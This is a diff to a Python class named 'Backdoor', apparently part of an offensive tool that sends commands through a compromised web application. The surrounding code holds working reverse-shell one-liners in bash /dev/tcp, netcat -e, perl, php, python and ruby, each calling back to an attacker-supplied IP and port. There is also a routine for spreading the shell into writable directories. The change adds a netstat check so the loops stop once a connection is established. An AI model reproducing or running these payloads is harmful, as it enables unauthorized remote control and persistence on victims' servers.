@@ -1,5 +1,4 @@
 import string
-import random
 
 from subprocess import Popen, PIPE
 from random import choice
@@ -51,6 +50,8 @@ class Backdoor(object):
             for path in bash:
                 cmd = 'nohup {0} -c \'{0} -i >& /dev/tcp/{1}/{2} 0>&1\' &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
 
     def msf(self, ip, port):
@@ -94,6 +95,8 @@ class Backdoor(object):
             for path in netcat:
                 cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find netcat on the remote system', 'red')
@@ -120,6 +123,8 @@ class Backdoor(object):
                 cmd += 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                 cmd += 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &'
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find perl on the remote system', 'red')
@@ -203,6 +208,8 @@ class Backdoor(object):
                 cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
                 cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find php-cli on the remote system', 'red')
@@ -230,6 +237,8 @@ class Backdoor(object):
                 cmd += 'os.dup2(s.fileno(),2);'
                 cmd += 'p=subprocess.call(["/bin/sh","-i"]);\' &'
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find python on the remote system', 'red')
@@ -252,9 +261,14 @@ class Backdoor(object):
                 cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
                 cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find ruby on the remote system', 'red')
+
+    def checkPort(self, port):
+        return make_request.get_page_source('netstat -nltp | grep {0}'.format(port))
 
     # A method to spread the shell in all writable directories
     def spread(self):
@@ -284,6 +298,8 @@ class Backdoor(object):
             for path in xterm:
                 cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                 make_request.get_page_source(cmd)
+                if self.checkPort(port):
+                    break
             cprint('[+] Done!', 'blue')
         else:
             cprint('\n[!] Didn\'t find xterm on the remote system', 'red')
